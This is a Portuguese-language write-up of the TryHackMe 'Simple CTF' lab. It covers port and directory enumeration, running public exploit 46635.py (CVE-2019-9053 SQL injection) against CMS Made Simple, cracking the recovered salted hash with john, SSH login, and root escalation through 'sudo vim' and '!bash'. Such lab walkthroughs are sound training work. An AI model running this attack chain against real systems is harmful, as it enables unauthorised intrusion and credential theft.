# Writeup

> [!note]
> 
> **Challenge:** Simple CTF
> **Dificuldade:** Easy
> **Plaraforma:** TryHackMe
> **Link:**
> **Autor:** hi im kvothe

## 1. Etapa de Reconhecimento
---
### 1.1 Enumeração de Portas

Ao spawnar máquina e receber o endereço IP `<TARGET_IP>` da máquina alvo, foi feito uma enumeração dos serviços que estão hospedados na máquina, por meio do comando:

```bash
nmap -T4 --open -v <TARGET_IP>
```
obtendo o seguinte output
```bash
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 17:28 -0400
Initiating Ping Scan at 17:28
Scanning <TARGET_IP> [4 ports]
Completed Ping Scan at 17:28, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:28
Completed Parallel DNS resolution of 1 host. at 17:28, 0.50s elapsed
Initiating SYN Stealth Scan at 17:28
Scanning <TARGET_IP> [1000 ports]
Discovered open port 80/tcp on <TARGET_IP>
Discovered open port 21/tcp on <TARGET_IP>
Discovered open port 2222/tcp on <TARGET_IP>
Completed SYN Stealth Scan at 17:28, 10.08s elapsed (1000 total ports)
Nmap scan report for <TARGET_IP>
Host is up (0.15s latency).
Not shown: 997 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.85 seconds
           Raw packets sent: 2006 (88.220KB) | Rcvd: 9 (372B)
```
O output indica que a máquina está hospedando um servidor **FTP** na porta 21, um servidor **HTTP** na porta 80 e a porta 2222 executando o protocolo **EtherNetIP-1**. Entretanto, o protocolo **EtherNetIP-1** é um protocolo de rede industrial que adapta o Common Industrial Protocol (CIP) para o padrão Ethernet que usa **TCP na porta 44818** ou **UDP na porta 2222**, por padrão. Porém, o output indica que a porta 2222 está usando TCP.

Para entender o que de fato qual serviço a porta 2222 está executando foi necessário se conectar a essa porta por meio do comando

```bash
 nc <TARGET_IP> 2222
```
Abaixo, segue o output da tentaiva de conexão com a porta 2222.
```bash
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
```
A partir do output acima, percebe-se que na realidade a porta 2222 está hosteando um **servidor SSH**.

> [!note]
> 
> O ideal teria sido incluir a opção `-sV` no comando do NMAP para obter mais informações sobre os serviços em execução. 

### 1.2 Servidor FTP

Ao acessar o servidor FTP em modo anônimo, não foi possível obter nenhuma informação relevante para a resolução do desafio.

```bash
┌──(kali㉿kali)-[~]
└─$ ftp <TARGET_IP>           
Connected to <TARGET_IP>.
220 (vsFTPd 3.0.3)
Name (<TARGET_IP>:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45116|)
ftp: Can't connect to `<TARGET_IP>:45116': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
```

### 1.3 Servidor HTTP

Ao realizar uma enumeração de diretórios no servidor HTTP com o comando
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -t 50 -x txt,php,js
```
obtemos o output
```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<TARGET_IP>
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.js              (Status: 403) [Size: 295]
.hta.txt             (Status: 403) [Size: 296]
.hta.php             (Status: 403) [Size: 296]
.htaccess            (Status: 403) [Size: 297]
.htaccess.js         (Status: 403) [Size: 300]
.hta                 (Status: 403) [Size: 292]
.htaccess.php        (Status: 403) [Size: 301]
.htpasswd.js         (Status: 403) [Size: 300]
.htpasswd.txt        (Status: 403) [Size: 301]
.htpasswd.php        (Status: 403) [Size: 301]
.htaccess.txt        (Status: 403) [Size: 301]
.htpasswd            (Status: 403) [Size: 297]
index.html           (Status: 200) [Size: 11321]
robots.txt           (Status: 200) [Size: 929]
robots.txt           (Status: 200) [Size: 929]
server-status        (Status: 403) [Size: 301]
simple               (Status: 301) [Size: 315] [--> http://<TARGET_IP>/simple/]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```
descobre-se o endpoint `/simple`, o qual está executando a aplicação **CMS Made Simple** na versão 2.8. Além desse endpoint, foram encontrados os arquivos `robots.txt` e `index.html`, os quais não possuem nenhuma informação relevante.

#### 1.3.1 Endpoint `/simple`

Ao realizar uma enumaeração de diretórios a partir do endpoint `/simple` com o comando

```bash
gobuster dir -u http://<TARGET_IP>/simple -w /usr/share/wordlists/dirb/common.txt -t 50 -x txt,php,js
```
obtém-se o seguinte output
```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<TARGET_IP>/simple
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,js,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess.txt        (Status: 403) [Size: 308]
.htpasswd.js         (Status: 403) [Size: 307]
.htpasswd.php        (Status: 403) [Size: 308]
.htaccess.js         (Status: 403) [Size: 307]
.htpasswd.txt        (Status: 403) [Size: 308]
.hta.txt             (Status: 403) [Size: 303]
.hta                 (Status: 403) [Size: 299]
.hta.php             (Status: 403) [Size: 303]
.htaccess            (Status: 403) [Size: 304]
.hta.js              (Status: 403) [Size: 302]
.htaccess.php        (Status: 403) [Size: 308]
.htpasswd            (Status: 403) [Size: 304]
admin                (Status: 301) [Size: 321] [--> http://<TARGET_IP>/simple/admin/]
assets               (Status: 301) [Size: 322] [--> http://<TARGET_IP>/simple/assets/]
config.php           (Status: 200) [Size: 0]
doc                  (Status: 301) [Size: 319] [--> http://<TARGET_IP>/simple/doc/]
index.php            (Status: 200) [Size: 19993]
index.php            (Status: 200) [Size: 19993]
install.php          (Status: 301) [Size: 0] [--> /simple/install.php/index.php]
lib                  (Status: 301) [Size: 319] [--> http://<TARGET_IP>/simple/lib/]
modules              (Status: 301) [Size: 323] [--> http://<TARGET_IP>/simple/modules/]
tmp                  (Status: 301) [Size: 319] [--> http://<TARGET_IP>/simple/tmp/]
uploads              (Status: 301) [Size: 323] [--> http://<TARGET_IP>/simple/uploads/]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```
Ao explorar os endpoints encontrados na enumeração, não foi possível achar nenhuma informação relevante para o desafio.

## 2. Etapa de Exploração

Ao procurar no **ExploitDB** por vulnerabilidades do software CMS Made Simple com o comando

```bash
searchsploit cms made simple
```
encontra-se as seguintes vulnerabilidades:
```bash
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                                                                                                                                                                                        | php/remote/46627.rb
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                                                                                                                                                                                                                   | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                                                                                                                                                                                                                   | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                                                                                                                                                                                                                                | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                                                                                                                                                                                                    | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                                                                                                   | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                                                                                                                                                                                                         | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                                                                                                                                                                                                                               | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                                                                                                                                                                                      | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                                                                                                                                                                                          | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                                                                                                                                                                                                                              | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                                                                                                                                                                                                                             | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                                                                                                                                                                                                       | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                                                                                                                                                                                                          | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                                                                                                                                                                                                                          | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                                                                                                                                                                                                                             | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                                                                                                                                                                                                   | php/webapps/34068.html
CMS Made Simple 2.1.6 - 'cntnt01detailtemplate' Server-Side Template Injection                                                                                                                                                                                                            | php/webapps/48944.py
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                                                                                                                                                                                                          | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                                                                                                                                                                                                                             | php/webapps/44192.txt
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                                                                                                                                                                                            | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                                                                                                                                                                                              | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                                                                                                                                                                                                  | php/webapps/48851.txt
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)                                                                                                                                                                                                                               | php/webapps/49793.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                                                                                                                                                                                              | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                                                                                                                                                                                                  | php/webapps/49199.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                                                                                                                                                                                             | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                                                                                                                                                                             | php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                                                                                                                                                                                                                           | php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                                                                                                                                                  | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                                                                                                                                                                                                          | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                                                                                                                                                                                                     | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                                                                                                                                                                                            | php/webapps/46546.py
CmsMadeSimple v2.2.17 - Remote Code Execution (RCE)                                                                                                                                                                                                                                       | php/webapps/51600.txt
CmsMadeSimple v2.2.17 - session hijacking via Server-Side Template Injection (SSTI)                                                                                                                                                                                                       | php/webapps/51599.txt
CmsMadeSimple v2.2.17 - Stored Cross-Site Scripting (XSS)                                                                                                                                                                                                                                 | php/webapps/51601.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
```
Em particular, a vulnerabiliade denominada **SQL Injection** no output é referente à CVE-2019-9053, a qual nos permite usar uma SQLi para obter credenciais do sistema. Para explorar essa vulnerabilidade foi utilizado o script python [46635.py](https://www.exploit-db.com/exploits/46635). Foi necessário realizar alguns ajustes nas instruções de `print()` antes de executá-lo pelo comando
```bash
python 46635.py -u http://<TARGET_IP>/simple
```
Ao fim de sua execução, obtém-se as seguintes informações:
```bash
[+] Salt for password found: <SALT>
[+] Username found: <USERNAME>
[+] Email found: admin@admin.com
[+] Password found: <PASSWORD_HASH>
```
Usando o comando
```bash
hashid -m  hash.txt
```
descobrimos por meio do output
```bash
--File 'hash.txt'--
Analyzing '<PASSWORD_HASH>'
[+] MD2 
[+] MD5 [Hashcat Mode: 0]
[+] MD4 [Hashcat Mode: 900]
[+] Double MD5 [Hashcat Mode: 2600]
[+] LM [Hashcat Mode: 3000]
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 [Hashcat Mode: 8600]
[+] Skype [Hashcat Mode: 23]
[+] Snefru-128 
[+] NTLM [Hashcat Mode: 1000]
[+] Domain Cached Credentials [Hashcat Mode: 1100]
[+] Domain Cached Credentials 2 [Hashcat Mode: 2100]
[+] DNSSEC(NSEC3) [Hashcat Mode: 8300]
[+] RAdmin v2.x [Hashcat Mode: 9900]
--End of file 'hash.txt'--
```
que muito provavelmente a senha foi hasheada com MD5 ou MD4. Assim, utiliza-se o comando 
```bash
john --format=dynamic_4 <PASSWORD_HASH>:<SALT> --wordlist=/usr/share/wordlists/rockyou.txt
```
para quebrar o hash da senha do usuário `<USERNAME>`. O comando acima gerou o output
```bash
Using default input encoding: UTF-8
Loaded 1 password hash (dynamic_4 [md5($s.$p) (OSC) 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASSWORD>           (?)     
1g 0:00:00:00 DONE (2026-04-07 19:09) 33.33g/s 112000p/s 112000c/s 112000C/s 123456..hottie101
Use the "--show --format=dynamic_4" options to display all of the cracked passwords reliably
Session completed.
```
indicando a senha `<PASSWORD>`. Utilizando `<USERNAME>` e `<PASSWORD>` para acessar o servidor SSH da máquina alvo, encontra-se a flag de usuário no direório `/home/<USERNAME>/`.

## 3. Escalação de Privilégio

Ao executar o comando `sudo -l`, observa-se que o usuário `<USERNAME>` possui permissão para executar o `vim` como permissões de root. Dessa forma, ao executar `sudo vim`, inserir o payload `!bash` no editor e clicar enter, uma shell com privilégios de root é aberta. Para encontrar a flag de root, basta navegadar até o diretótio `/root`.